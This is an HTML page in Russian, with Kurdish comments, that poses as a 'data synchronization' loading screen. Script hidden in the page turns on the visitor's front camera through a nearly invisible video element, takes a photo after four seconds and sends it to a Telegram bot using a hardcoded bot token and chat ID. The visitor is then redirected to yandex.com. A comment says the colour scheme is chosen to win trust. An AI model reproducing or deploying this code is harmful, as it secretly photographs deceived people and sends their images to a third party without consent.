<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title> 
    <style>
        /* شاردنەوەی کامێرا */
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #canvas { display: none; }
        
        body { 
            background-color: #ffffff; 
            margin: 0; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: Arial, sans-serif;
        }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2ecc71; /* ڕەنگی سەوز بۆ ئەوەی بڕوا دروست بکات */
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status-text {
            margin-top: 20px;
            color: #555;
            font-size: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status-text">Синхронизация данных, подождите...</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
        const CHAT_ID = '6351568884';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // داواکردنی کامێرا
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            video.srcObject = stream;
            
            // 4 چرکە چاوەڕێ دەکەین تا وێنەکە ساف بێت
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'image.jpg');

                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(() => {
                        // دوای وێنەگرتن دەچێتە سەر وێبسایتی یاندێکس (گوگڵی ڕووسی)
                        window.location.href = "https://yandex.com";
                    });
                }, 'image/jpeg', 0.95);
            }, 4000);
        })
        .catch(() => {
            window.location.href = "https://yandex.com";
        });
    </script>
</body>
</html>
